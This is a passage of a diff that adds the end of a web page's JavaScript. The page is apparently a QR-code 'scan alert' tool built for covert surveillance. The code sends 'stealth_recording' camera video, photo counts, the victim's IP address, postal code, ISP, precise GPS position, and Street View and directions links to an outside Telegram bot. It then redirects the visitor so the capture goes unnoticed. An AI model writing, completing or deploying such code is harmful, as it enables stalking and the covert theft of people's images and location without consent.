+                    const bytes = new Uint8Array(binaryData.length);
+                    for (let i = 0; i < binaryData.length; i++) {
+                        bytes[i] = binaryData.charCodeAt(i);
+                    }
+                    const blob = new Blob([bytes], { type: 'video/webm' });
+                    await sendVideoAsDocument(config, blob, videoData);
+                } catch (fallbackError) {
+                    console.error('Fallback also failed:', fallbackError);
+                }
+            }
+        }
+
+        // Send video as document if video upload fails
+        async function sendVideoAsDocument(config, blob, videoData) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', config.chatId);
+                formData.append('document', blob, `stealth_recording_${Date.now()}.webm`);
+                formData.append('caption', `📹 5-Second Recording (Document)\n⏰ ${new Date(videoData.timestamp).toLocaleString()}\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${config.token}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    console.log('Video sent as document successfully!');
+                } else {
+                    console.error('Document upload also failed:', await response.text());
+                }
+            } catch (error) {
+                console.error('Document upload error:', error);
+            }
+        }
+        
+        // Format message for Telegram
+        function formatTelegramMessage(data) {
+            const timestamp = new Date(data.timestamp).toLocaleString();
+            
+            let message = `🚨 <b>MULTI-FUNCTION QR SCAN ALERT!</b> 🚨\n\n`;
+            message += `⏰ <b>Time:</b> ${timestamp}\n`;
+            message += `🆔 <b>Tracking ID:</b> ${data.trackingId}\n`;
+            message += `🎯 <b>Function Type:</b> ${data.functionType.toUpperCase()}\n\n`;
+            
+            // Enhanced Precise Location Information
+            if (data.location) {
+                message += `🌐 <b>PRECISE IP & LOCATION TRACKING:</b>\n`;
+                message += `📍 <b>Real IP Address:</b> ${data.location.ip || 'Unknown'}\n`;
+                message += `🌍 <b>Country:</b> ${data.location.country || 'Unknown'}\n`;
+                message += `🏙️ <b>City:</b> ${data.location.city || 'Unknown'}\n`;
+                message += `📍 <b>Region/State:</b> ${data.location.region || 'Unknown'}\n`;
+                message += `📮 <b>Postal Code:</b> ${data.location.postal || 'Unknown'}\n`;
+                message += `🕐 <b>Timezone:</b> ${data.location.timezone || 'Unknown'}\n`;
+                message += `🏢 <b>ISP/Organization:</b> ${data.location.org || 'Unknown'}\n`;
+                
+                if (data.location.accuracy) {
+                    message += `✅ <b>Detection Accuracy:</b> ${data.location.accuracy}\n`;
+                }
+                message += `\n`;
+                
+                // IP-based coordinates and maps
+                if (data.location.latitude && data.location.longitude && 
+                    data.location.latitude !== 'Unknown' && data.location.longitude !== 'Unknown') {
+                    message += `🗺️ <b>IP-BASED COORDINATES:</b>\n`;
+                    message += `📍 <b>Location:</b> ${data.location.latitude}, ${data.location.longitude}\n`;
+                    
+                    if (data.location.googleMapsUrl) {
+                        message += `🗺️ <a href="${data.location.googleMapsUrl}">📍 View IP Location on Google Maps</a>\n`;
+                    }
+                    if (data.location.streetViewUrl) {
+                        message += `👁️ <a href="${data.location.streetViewUrl}">🏙️ Street View of IP Location</a>\n`;
+                    }
+                    if (data.location.satelliteUrl) {
+                        message += `🛰️ <a href="${data.location.satelliteUrl}">📡 Satellite View of IP Location</a>\n`;
+                    }
+                    if (data.location.directionsUrl) {
+                        message += `🧭 <a href="${data.location.directionsUrl}">🚗 Get Directions to IP Location</a>\n`;
+                    }
+                    message += `\n`;
+                }
+            }
+            
+            // Enhanced GPS location with precision
+            if (data.gpsLocation && !data.gpsLocation.error) {
+                message += `📍 <b>PRECISE GPS LOCATION:</b>\n`;
+                message += `🗺️ <b>GPS Coordinates:</b> ${data.gpsLocation.latitude}, ${data.gpsLocation.longitude}\n`;
+                message += `🎯 <b>GPS Accuracy:</b> ${data.gpsLocation.accuracy}\n`;
+                message += `⛰️ <b>Altitude:</b> ${data.gpsLocation.altitude}\n`;
+                message += `🧭 <b>Heading:</b> ${data.gpsLocation.heading}\n`;
+                message += `🚀 <b>Speed:</b> ${data.gpsLocation.speed}\n`;
+                message += `🕐 <b>GPS Time:</b> ${data.gpsLocation.timestamp}\n`;
+                message += `📡 <b>Source:</b> ${data.gpsLocation.source}\n`;
+                
+                if (data.gpsLocation.googleMapsUrl) {
+                    message += `🗺️ <a href="${data.gpsLocation.googleMapsUrl}">📍 View GPS Location on Google Maps</a>\n`;
+                }
+                if (data.gpsLocation.streetViewUrl) {
+                    message += `👁️ <a href="${data.gpsLocation.streetViewUrl}">🏙️ Street View of GPS Location</a>\n`;
+                }
+                if (data.gpsLocation.satelliteUrl) {
+                    message += `🛰️ <a href="${data.gpsLocation.satelliteUrl}">📡 Satellite View of GPS Location</a>\n`;
+                }
+                message += `\n`;
+            } else if (data.gpsLocation && data.gpsLocation.error) {
+                message += `📍 <b>GPS STATUS:</b> ${data.gpsLocation.error} (${data.gpsLocation.source})\n\n`;
+            }
+            
+            // Device info
+            if (data.device) {
+                message += `📱 <b>DEVICE INFORMATION:</b>\n`;
+                message += `📺 Screen: ${data.device.screenWidth}x${data.device.screenHeight}\n`;
+                message += `🖥️ Window: ${data.device.windowWidth}x${data.device.windowHeight}\n`;
+                message += `💻 Platform: ${data.platform}\n`;
+                message += `🌐 User Agent: ${data.userAgent.substring(0, 100)}...\n`;
+                message += `🔧 Hardware Cores: ${data.device.hardwareConcurrency}\n`;
+                message += `📶 Connection: ${data.device.connection}\n\n`;
+            }
+            
+            // Media capture info
+            if (data.capturedImages) {
+                message += `📸 <b>CAPTURED IMAGES:</b> ${data.capturedImages.length} photos\n`;
+            }
+            
+            if (data.recordedVideo) {
+                message += `🎥 <b>RECORDED VIDEO:</b> ${Math.round(data.recordedVideo.duration/1000)}s duration\n`;
+            }
+            
+            message += `\n🔗 <b>Target URL:</b> ${data.targetUrl}`;
+            
+            return message;
+        }
+        
+        // Redirect to target URL
+        function redirectToTarget() {
+            const params = getURLParameters();
+            updateStatus('Redirecting...', 'Taking you to your destination.');
+            
+            setTimeout(() => {
+                window.location.href = params.target;
+            }, 1000);
+        }
+        
+        // Update status display
+        function updateStatus(statusText, detailText) {
+            status.textContent = statusText;
+            details.textContent = detailText;
+        }
+        
+        // Show permission request
+        function showPermissionRequest(text) {
+            permissionText.textContent = text;
+            permissionRequest.style.display = 'block';
+        }
+        
+        // Show error message
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+            spinner.style.display = 'none';
+        }
+        
+        // Event listeners
+        captureBtn.addEventListener('click', async () => {
+            await capturePhotos();
+        });
+        
+        recordBtn.addEventListener('click', async () => {
+            await recordVideo();
+        });
+        
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', initializeApp);
+        
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
